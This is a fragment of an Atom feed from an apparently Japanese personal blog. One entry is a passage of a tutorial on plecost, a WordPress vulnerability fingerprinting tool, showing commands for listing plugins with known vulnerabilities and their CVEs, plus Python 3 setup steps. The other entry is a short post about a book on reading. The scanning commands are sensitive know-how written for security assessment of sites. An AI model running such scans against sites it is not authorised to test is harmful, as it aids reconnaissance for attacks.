<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plecost -nb <span class="comment">--show-plugins</span></span><br></pre></td></tr></table></figure>
<p>実行結果</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb --show-plugins</span><br><span class="line"></span><br><span class="line"><span class="comment">// Plecost - Wordpress finger printer Tool - v1.0.0</span></span><br><span class="line"></span><br><span class="line">[*] Plugins with vulnerabilities known:</span><br><span class="line"></span><br><span class="line">    &#123; <span class="number">0</span> &#125; - ab_google_map_travel</span><br><span class="line">    &#123; <span class="number">1</span> &#125; - acobot_live_chat_%<span class="number">26</span>_contact_form</span><br><span class="line">    &#123; <span class="number">2</span> &#125; - activehelper_livehelp_live_chat</span><br><span class="line">    &#123; <span class="number">3</span> &#125; - ad-manager</span><br><span class="line">    &#123; <span class="number">4</span> &#125; - alipay</span><br><span class="line">    &#123; <span class="number">5</span> &#125; - all-video-gallery</span><br><span class="line">(省略)</span><br></pre></td></tr></table></figure>
<p>プラグインの脆弱性情報は、先ほど実行したプラグインリストを<code>-vp</code>オプションに渡すことで確認することが出来る。</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">plecost</span> -nb -vp infusionsoft_gravity_forms</span><br></pre></td></tr></table></figure>
<p>実行結果</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb -vp infusionsoft_gravity_forms</span><br><span class="line"></span><br><span class="line">// Plecost - Wordpress finger printer Tool - v1.0.0</span><br><span class="line"></span><br><span class="line">[<span class="keyword">*</span>] Associated CVEs for plugin 'infusionsoft_gravity_forms':</span><br><span class="line"></span><br><span class="line">    &#123; 0 &#125; - CVE-2014-6446:</span><br><span class="line"></span><br><span class="line">             Affected versions:</span><br><span class="line"></span><br><span class="line">             <span class="variable">&lt;0&gt;</span> - 1.5.7.2</span><br><span class="line">             <span class="variable">&lt;1&gt;</span> - 1.5.7.1</span><br><span class="line">             <span class="variable">&lt;2&gt;</span> - 1.5.4.2</span><br><span class="line">             <span class="variable">&lt;3&gt;</span> - 1.5.9.5</span><br><span class="line">             <span class="variable">&lt;4&gt;</span> - 1.5.8.1</span><br><span class="line">             <span class="variable">&lt;5&gt;</span> - 1.5.10</span><br><span class="line">             <span class="variable">&lt;6&gt;</span> - 1.5.9.4</span><br><span class="line">             <span class="variable">&lt;7&gt;</span> - 1.5.9.1</span><br><span class="line">             <span class="variable">&lt;8&gt;</span> - 1.5.9.3</span><br><span class="line">             <span class="variable">&lt;9&gt;</span> - 1.5.9.2</span><br><span class="line">             <span class="variable">&lt;10&gt;</span> - 1.5.0</span><br><span class="line">             <span class="variable">&lt;11&gt;</span> - 1.5.1</span><br><span class="line">             <span class="variable">&lt;12&gt;</span> - 1.5.2</span><br><span class="line">             <span class="variable">&lt;13&gt;</span> - 1.5.3</span><br><span class="line">             <span class="variable">&lt;14&gt;</span> - 1.5.4</span><br><span class="line">             <span class="variable">&lt;15&gt;</span> - 1.5.5</span><br><span class="line">             <span class="variable">&lt;16&gt;</span> - 1.5.6</span><br><span class="line">             <span class="variable">&lt;17&gt;</span> - 1.5.7</span><br><span class="line">             <span class="variable">&lt;18&gt;</span> - 1.5.8</span><br><span class="line">             <span class="variable">&lt;19&gt;</span> - 1.5.9</span><br><span class="line">             <span class="variable">&lt;20&gt;</span> - 1.5.4.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="keyword">*</span>] Done!</span><br></pre></td></tr></table></figure>
<p>以上が簡単な使い方になる。<br>是非、試してみてはどうだろうか？</p>
<hr>
<h2 id="u53C2_u7167URL"><a href="#u53C2_u7167URL" class="headerlink" title="参照URL"></a>参照URL</h2><ul>
<li><a href="https://devops.profitbricks.com/tutorials/install-python-3-in-centos-7/" target="_blank" rel="external">python3</a></li>
<li><a href="http://qiita.com/murachi1208/items/202bff84964188619f57" target="_blank" rel="external">SCL</a></li>
<li><a href="https://github.com/iniqua/plecost" target="_blank" rel="external">plecost</a></li>
<li><a href="http://www.ehacking.net/2015/06/plecost-wordpress-vulnerabilities-finder.html" target="_blank" rel="external">Wordpress Vulnerabilities Finder</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://atani.github.io/2015/04/wordpress利用サイトのセキュリティ診断書を作成する/">wordpress利用サイトのセキュリティ診断書を作成する</a>では、<br><code>wpscan</code> を紹介した。今回は、<code>plecost3</code> をご紹介。</p>
<p>plecost3 を動かすにはpython3で必要なので、簡単にpython3のインストール手順からご紹介する。</p>
<h2 id="python3_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB"><a href="#python3_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB" class="headerlink" title="python3をインストール"></a>python3をインストール</h2><p>リポジトリを登録</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -<span class="constant">Uvh</span> <span class="symbol">https:</span>/<span class="regexp">/www.softwarecollections.org/en</span><span class="regexp">/scls/rhscl</span><span class="regexp">/python33/epel</span>-<span class="number">7</span>-x86_64/download/rhscl-python33-epel-<span class="number">7</span>-x86_64.noarch.rpm</span><br></pre></td></tr></table></figure>
<p>python3 をインストール</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> python33</span><br></pre></td></tr></table></figure>
<p>scl(Software Collections)でpython3を利用するように設定。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scl <span class="built_in">enable</span> python33 bash</span><br></pre></td></tr></table></figure>
<p>pip をインストール</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">easy_install</span> pip</span><br></pre></td></tr></table></figure>]]>
    
    </summary>
    
      <category term="penetration" scheme="http://atani.github.io/tags/penetration/"/>
    
      <category term="security" scheme="http://atani.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一冊の本で劇的に変われた話]]></title>
    <link href="http://atani.github.io/2015/07/%E4%B8%80%E5%86%8A%E3%81%AE%E6%9C%AC%E3%81%A7%E5%8A%87%E7%9A%84%E3%81%AB%E5%A4%89%E3%82%8F%E3%82%8C%E3%81%9F/"/>
    <id>http://atani.github.io/2015/07/一冊の本で劇的に変われた/</id>
    <published>2015-07-14T15:00:26.000Z</published>
    <updated>2015-07-14T15:03:20.000Z</updated>
    <content type="html"><![CDATA[<p>これまでブログをやってみるものの３日坊主だった私が今、アウトプットをし続けてる事が出来ているのは一冊の本に出会ったから。</p>
<a id="more"></a>
<p>樺沢紫苑 著の 「読んだら忘れない読書術」</p>
<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=daystoremem-22&o=9&p=8&l=as1&m=amazon&f=ifr&ref=qf_sp_asin_til&asins=4763134507" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>

<p>たくさんタメになる事が書かれているが、その中で特に<b>出来るだけ</b>実践している事を抜粋。</p>
<ul>
<li>１週間に３〜４回のアウトプットをする事で記憶に残りやすくなる。</li>
<li>読書をする事で、物事を習得する時間を節約出来る。</li>
<li>速読より深読。早く読んでも記憶に残っていなければ読んでないのと一緒。</li>
</ul>
<p>などなど。</p>
<p>2000円かからず、他人が時間をかけて学んだ体験を学べる本はすごい！</p>
<p>先ほど出来るだけ実践はしていると記載したが、<br><a href="https://twitter.com/monochromegane" target="_blank" rel="external">goroutine三段さん</a> に<br><b>「がんばりすぎると続かないゾ」 </b><br>と本ブログ立ち上げの際にアドバイスいただいていたので、一切無理はしてないし、楽しく物事を習得できている。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>これまでブログをやってみるものの３日坊主だった私が今、アウトプットをし続けてる事が出来ているのは一冊の本に出会ったから。</p>]]>
    
    </summary>
    
      <category term="notes" scheme="http://atani.github.io/tags/notes/"/>
    
  </entry>
  
</feed>
